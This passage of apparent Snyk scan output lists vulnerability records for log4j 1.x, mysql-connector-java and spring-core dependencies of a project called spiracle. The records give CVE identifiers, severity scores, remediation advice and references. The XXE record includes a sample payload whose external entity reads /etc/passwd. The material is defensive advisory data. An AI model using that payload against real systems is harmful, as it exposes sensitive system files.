      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `JMSSink` in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing `JMSSink` to perform `JNDI` requests that result in remote code execution in a similar fashion to [`CVE-2021-4104`](https://security.snyk.io/vuln/SNYK-JAVA-LOG4J-2316893).  \r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use `JMSSink`, which is not the default.\r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n",
      "disclosureTime": "2022-01-18T17:22:50Z",
      "exploit": "Not Defined",
      "fixedIn": [],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-LOG4J-2342647",
      "identifiers": {
        "CVE": [
          "CVE-2022-23302"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2022-01-18T17:28:19.186551Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-18T17:28:19Z",
      "references": [
        {
          "title": "Apache Mailing List",
          "url": "https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w"
        },
        {
          "title": "Apache Security Advisory",
          "url": "https://logging.apache.org/log4j/1.2/index.html"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "high",
      "socialTrendAlert": true,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2020-06-18T15:47:31.144561Z",
      "credit": [
        "Marcio Almeida de Macedo"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E)\n- [PoC](https://0xsapra.github.io/website/CVE-2019-17571)\n",
      "disclosureTime": "2019-12-22T09:33:11Z",
      "exploit": "Proof of Concept",
      "fixedIn": [],
      "functions": [
        {
          "functionId": {
            "className": "SocketServer",
            "filePath": "org/apache/log4j/net/SocketServer.java",
            "functionName": "main"
          },
          "version": [
            "[0,]"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.apache.log4j.net.SocketServer",
            "functionName": "main"
          },
          "version": [
            "[0,]"
          ]
        }
      ],
      "id": "SNYK-JAVA-LOG4J-572732",
      "identifiers": {
        "CVE": [
          "CVE-2019-17571"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-2qrg-x229-3v8q"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "log4j",
        "groupId": "log4j"
      },
      "modificationTime": "2021-01-24T09:35:02.800085Z",
      "moduleName": "log4j:log4j",
      "packageManager": "maven",
      "packageName": "log4j:log4j",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-06-19T09:33:01Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E"
        },
        {
          "title": "PoC",
          "url": "https://0xsapra.github.io/website/CVE-2019-17571"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "critical",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-05-02T15:09:42.271555Z",
      "credit": [
        "Michael Nielson"
      ],
      "cvssScore": 6.3,
      "description": "## Overview\n\n[mysql:mysql-connector-java](https://mvnrepository.com/artifact/mysql/mysql-connector-java) provides connectivity for client applications developed in the Java programming language with MySQL Connector/J, a driver that implements the Java Database Connectivity (JDBC) API.\n\n\nAffected versions of this package are vulnerable to Privilege Escalation.\nA user with high privileges who is logged onto the infrastructure  where MySQL Connectors executes to compromise MySQL Connectors. Successful attacks require human interaction from a person other than the attacker.\n\n## Remediation\n\nUpgrade `mysql:mysql-connector-java` to version 8.0.16 or higher.\n\n\n## References\n\n- [Oracle Security Advisory](https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html)\n\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1703402)\n",
      "disclosureTime": "2019-04-23T00:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "8.0.16"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-MYSQL-174574",
      "identifiers": {
        "CVE": [
          "CVE-2019-2692"
        ],
        "CWE": [
          "CWE-843"
        ],
        "GHSA": [
          "GHSA-jcq3-cprp-m333"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "mysql-connector-java",
        "groupId": "mysql"
      },
      "modificationTime": "2019-05-02T15:12:23.274717Z",
      "moduleName": "mysql:mysql-connector-java",
      "packageManager": "maven",
      "packageName": "mysql:mysql-connector-java",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-05-02T08:12:51Z",
      "references": [
        {
          "title": "Oracle Security Advisory",
          "url": "https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1703402"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,8.0.16)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Privilege Escalation",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "mysql:mysql-connector-java@5.1.34"
      ],
      "upgradePath": [
        false,
        "mysql:mysql-connector-java@8.0.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "mysql:mysql-connector-java",
      "version": "5.1.34"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-10-24T09:26:50.140786Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 5.9,
      "description": "## Overview\n[mysql:mysql-connector-java](https://mvnrepository.com/artifact/mysql/mysql-connector-java) is a provides connectivity for client applications developed in the Java programming language with MySQL Connector/J, a driver that implements the Java Database Connectivity (JDBC) API.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection via the `getSource()` method, due to a missing check for external entities.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `mysql:mysql-connector-java` to version 8.0.27 or higher.\n## References\n- [GitHub Commit](https://github.com/mysql/mysql-connector-j/commit/4993d5735fd84a46e7d949ad1bcaa0e9bb039824)\n- [PoC](https://pyn3rd.github.io/2021/10/22/mysql-jdbc-xxe/)\n",
      "disclosureTime": "2021-10-24T08:55:05Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "8.0.27"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-MYSQL-1766958",
      "identifiers": {
        "CVE": [
          "CVE-2021-2471"
        ],
        "CWE": [
          "CWE-611"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "mysql-connector-java",
        "groupId": "mysql"
      },
      "modificationTime": "2021-10-24T15:02:10.133790Z",
      "moduleName": "mysql:mysql-connector-java",
      "packageManager": "maven",
      "packageName": "mysql:mysql-connector-java",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-10-24T15:02:10.267240Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/mysql/mysql-connector-j/commit/4993d5735fd84a46e7d949ad1bcaa0e9bb039824"
        },
        {
          "title": "PoC",
          "url": "https://pyn3rd.github.io/2021/10/22/mysql-jdbc-xxe/"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,8.0.27)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "XML External Entity (XXE) Injection",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "mysql:mysql-connector-java@5.1.34"
      ],
      "upgradePath": [
        false,
        "mysql:mysql-connector-java@8.0.27"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "mysql:mysql-connector-java",
      "version": "5.1.34"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2022-01-28T13:08:27.900350Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.6,
      "description": "## Overview\n[mysql:mysql-connector-java](https://mvnrepository.com/artifact/mysql/mysql-connector-java) is a provides connectivity for client applications developed in the Java programming language with MySQL Connector/J, a driver that implements the Java Database Connectivity (JDBC) API.\n\nAffected versions of this package are vulnerable to Improper Authorization via the `MysqlSQLXML::getSource()` function. A malicious actor with high privileges can access all of the MySQL connector's accessible data and crash the connectors.\n## Remediation\nUpgrade `mysql:mysql-connector-java` to version 8.0.28 or higher.\n## References\n- [Oracle Security Advisory](https://www.oracle.com/security-alerts/cpujan2022.html)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2020583)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2047343)\n",
      "disclosureTime": "2022-01-18T00:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "8.0.28"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-MYSQL-2386864",
      "identifiers": {
        "CVE": [
          "CVE-2022-21363"
        ],
        "CWE": [
          "CWE-285"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "mysql-connector-java",
        "groupId": "mysql"
      },
      "modificationTime": "2022-01-28T14:50:31.735538Z",
      "moduleName": "mysql:mysql-connector-java",
      "packageManager": "maven",
      "packageName": "mysql:mysql-connector-java",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-28T14:50:31.888874Z",
      "references": [
        {
          "title": "Oracle Security Advisory",
          "url": "https://www.oracle.com/security-alerts/cpujan2022.html"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2020583"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2047343"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,8.0.28)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Improper Authorization",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "mysql:mysql-connector-java@5.1.34"
      ],
      "upgradePath": [
        false,
        "mysql:mysql-connector-java@8.0.28"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "mysql:mysql-connector-java",
      "version": "5.1.34"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2017-05-17T12:10:22.492000Z",
      "credit": [
        "Thijs Alkemade"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[`mysql:mysql-connector-java`](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22mysql-connector-java%22)\nVulnerability in the MySQL Connectors component of Oracle MySQL (subcomponent: Connector/J). Supported versions that are affected are 5.1.40 and earlier. Difficult to exploit vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Connectors. While the vulnerability is in MySQL Connectors, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of MySQL Connectors. \n\n## References\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-3523)\n- [Oracle Advisory](http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html)\n",
      "disclosureTime": "2017-04-24T19:59:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "5.1.41"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-MYSQL-31399",
      "identifiers": {
        "CVE": [
          "CVE-2017-3523"
        ],
        "CWE": [
          "CWE-284"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "mysql-connector-java",
        "groupId": "mysql"
      },
      "modificationTime": "2019-05-02T15:12:07.000738Z",
      "moduleName": "mysql:mysql-connector-java",
      "packageManager": "maven",
      "packageName": "mysql:mysql-connector-java",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-05-21T07:52:36.871000Z",
      "references": [
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-3523"
        },
        {
          "title": "Oracle Security Advisory",
          "url": "http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,5.1.41)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Improper Access Control",
      "severityWithCritical": "high",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "mysql:mysql-connector-java@5.1.34"
      ],
      "upgradePath": [
        false,
        "mysql:mysql-connector-java@5.1.41"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "mysql:mysql-connector-java",
      "version": "5.1.34"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2017-05-17T12:10:22.727000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 3.3,
      "description": "## Overview\nVulnerability in the MySQL Connectors component of Oracle MySQL (`subcomponent: Connector/J`). The vulnerability allows low privileged attacker with logon to the infrastructure where MySQL Connectors executes to compromise MySQL Connectors. Successful attacks can result in unauthorized update, insert or delete access to some of MySQL Connectors accessible data.\n\n## References\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-3589)\n- [Oracle Security Advisory](http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html)\n",
      "disclosureTime": "2017-04-24T19:59:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "5.1.42"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-MYSQL-31449",
      "identifiers": {
        "CVE": [
          "CVE-2017-3589"
        ],
        "CWE": [
          "CWE-284"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "mysql-connector-java",
        "groupId": "mysql"
      },
      "modificationTime": "2019-05-02T15:12:07.007645Z",
      "moduleName": "mysql:mysql-connector-java",
      "packageManager": "maven",
      "packageName": "mysql:mysql-connector-java",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-05-21T07:52:36Z",
      "references": [
        {
          "title": "NVD",
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-3589"
        },
        {
          "title": "Oracle Security Advisory",
          "url": "http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,5.1.42)"
        ]
      },
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Improper Access Control",
      "severityWithCritical": "low",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "mysql:mysql-connector-java@5.1.34"
      ],
      "upgradePath": [
        false,
        "mysql:mysql-connector-java@5.1.42"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "mysql:mysql-connector-java",
      "version": "5.1.34"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2017-11-05T11:28:24.575000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.4,
      "description": "## Overview\r\n[`mysql:mysql-connector-java`](https://mysql) provides connectivity for client applications developed in the Java programming language with MySQL Connector/J, a driver that implements the Java Database Connectivity (JDBC) API.\r\n\r\nAffected versions of the package are vulnerable to Arbitrary Code Execution.\r\nVulnerability in the MySQL Connectors component of Oracle MySQL (subcomponent: Connector/J). Supported versions that are affected are 5.1.41 and earlier. Easily \"exploitable\" vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Connectors. While the vulnerability is in MySQL Connectors, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of MySQL Connectors accessible data as well as unauthorized read access to a subset of MySQL Connectors accessible data.\r\n\r\n## Remediation\r\nUpgrade `mysql:mysql-connector-java` to version 5.1.42 or higher.\r\n\r\n## References\r\n- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-3586)\r\n- [Securityfocus](http://www.securityfocus.com/bid/97982)\r\n- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1444759)",
      "disclosureTime": "2017-04-23T21:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "5.1.42"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ResultSet",
            "filePath": "com/mysql/jdbc/ResultSet.java",
            "functionName": "getNativeConvertToString"
          },
          "version": [
            "[3.0.11, 5.1.1)"
          ]
        },
        {
          "functionId": {
            "className": "ResultSetImpl",
            "filePath": "com/mysql/jdbc/ResultSetImpl.java",
            "functionName": "getNativeConvertToString"
          },
          "version": [
            "[5.1.1, 5.1.42)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.mysql.jdbc.ResultSet",
            "functionName": "getNativeConvertToString"
          },
          "version": [
            "[3.0.11, 5.1.1)"
          ]
        },
        {
          "functionId": {
            "className": "com.mysql.jdbc.ResultSetImpl",
            "functionName": "getNativeConvertToString"
          },
          "version": [
            "[5.1.1, 5.1.42)"
          ]
        }
      ],
      "id": "SNYK-JAVA-MYSQL-31580",
      "identifiers": {
        "CVE": [
          "CVE-2017-3586"
        ],
        "CWE": [
          "CWE-284"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "mysql-connector-java",
        "groupId": "mysql"
      },
      "modificationTime": "2019-04-03T08:00:58.144137Z",
      "moduleName": "mysql:mysql-connector-java",
      "packageManager": "maven",
      "packageName": "mysql:mysql-connector-java",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-11-09T03:28:24Z",
      "references": [
        {
          "title": "NVD",
          "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-3586"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1444759"
        },
        {
          "title": "Security Focus",
          "url": "http://www.securityfocus.com/bid/97982"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,5.1.42)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "mysql:mysql-connector-java@5.1.34"
      ],
      "upgradePath": [
        false,
        "mysql:mysql-connector-java@5.1.42"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "mysql:mysql-connector-java",
      "version": "5.1.34"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:F/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2019-07-03T09:47:48.210085Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 5.4,
      "description": "## Overview\n\n[mysql:mysql-connector-java](https://mvnrepository.com/artifact/mysql/mysql-connector-java) provides connectivity for client applications developed in the Java programming language with MySQL Connector/J, a driver that implements the Java Database Connectivity (JDBC) API.\n\n\nAffected versions of this package are vulnerable to SQL Injection.\nRemote authenticated users may be allowed to read, update, insert or delete access to a subset of MySQL Connector accessible data.\n\n## Remediation\n\nUpgrade `mysql:mysql-connector-java` to version 5.1.35 or higher.\n\n\n## References\n\n- [Netapp Security Advisory](https://security.netapp.com/advisory/ntap-20150417-0003/)\n\n- [Oracle Security Bulletin](https://www.oracle.com/technetwork/topics/security/cpuapr2015-2365600.html)\n",
      "disclosureTime": "2015-04-16T09:39:56Z",
      "exploit": "Functional",
      "fixedIn": [
        "5.1.35"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-MYSQL-451460",
      "identifiers": {
        "CVE": [
          "CVE-2015-2575"
        ],
        "CWE": [
          "CWE-89"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "mysql-connector-java",
        "groupId": "mysql"
      },
      "modificationTime": "2019-07-03T12:32:21.332877Z",
      "moduleName": "mysql:mysql-connector-java",
      "packageManager": "maven",
      "packageName": "mysql:mysql-connector-java",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-07-03T09:36:59Z",
      "references": [
        {
          "title": "Netapp Security Advisory",
          "url": "https://security.netapp.com/advisory/ntap-20150417-0003/"
        },
        {
          "title": "Oracle Security Bulletin",
          "url": "https://www.oracle.com/technetwork/topics/security/cpuapr2015-2365600.html"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,5.1.35)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "SQL Injection",
      "severityWithCritical": "medium",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "mysql:mysql-connector-java@5.1.34"
      ],
      "upgradePath": [
        false,
        "mysql:mysql-connector-java@5.1.35"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "mysql:mysql-connector-java",
      "version": "5.1.34"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-07-03T11:21:28.809268Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.8,
      "description": "## Overview\n\n[mysql:mysql-connector-java](https://mvnrepository.com/artifact/mysql/mysql-connector-java) provides connectivity for client applications developed in the Java programming language with MySQL Connector/J, a driver that implements the Java Database Connectivity (JDBC) API.\n\n\nAffected versions of this package are vulnerable to Access Control Bypass.\nA vulnerability in the `Connector/J` component allows low privileged attackers with network access via multiple protocols to compromise MySQL Connectors. Successful attacks of this vulnerability can result in takeover of MySQL Connectors.\n\n## Remediation\n\nUpgrade `mysql:mysql-connector-java` to version 8.0.13 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/mysql/mysql-connector-j/commit/8b59b9ebab61cc97bafe77ee05f79829b1376e47)\n\n- [Oracle Security Advisory](https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html#AppendixMSQL)\n",
      "disclosureTime": "2018-10-16T11:17:58Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "8.0.13"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-MYSQL-451464",
      "identifiers": {
        "CVE": [
          "CVE-2018-3258"
        ],
        "CWE": [
          "CWE-288"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "mysql-connector-java",
        "groupId": "mysql"
      },
      "modificationTime": "2019-07-03T12:32:21.341023Z",
      "moduleName": "mysql:mysql-connector-java",
      "packageManager": "maven",
      "packageName": "mysql:mysql-connector-java",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-07-03T11:17:57Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/mysql/mysql-connector-j/commit/8b59b9ebab61cc97bafe77ee05f79829b1376e47"
        },
        {
          "title": "Oracle Security Advisory",
          "url": "https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html%23AppendixMSQL"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,8.0.13)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Access Control Bypass",
      "severityWithCritical": "high",
      "from": [
        "com.waratek:spiracle@1.4.0",
        "mysql:mysql-connector-java@5.1.34"
      ],
      "upgradePath": [
        false,
        "mysql:mysql-connector-java@8.0.13"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "mysql:mysql-connector-java",
      "version": "5.1.34"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2022-01-02T11:14:46.053186Z",
      "credit": [
        "Dennis Kennedy"
      ],
      "cvssScore": 4.3,
      "description": "## Overview\n[org.springframework:spring-core](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22spring-core%22) is a core package within the spring-framework that contains multiple classes and utilities.\n\nAffected versions of this package are vulnerable to Improper Output Neutralization for Logs when a user provides malicious input, causing insertion of additional log entries.\n## Remediation\nUpgrade `org.springframework:spring-core` to version 5.3.12, 5.2.18 or higher.\n## References\n- [Github Commit](https://github.com/spring-projects/spring-framework/commit/346b75580267dc5d8d257be198d5841ce4e1add5)\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2021-22096)\n",
      "disclosureTime": "2021-10-27T12:52:59Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "5.3.12",
        "5.2.18"
      ],
      "functions": [],
      "functions_new": [],
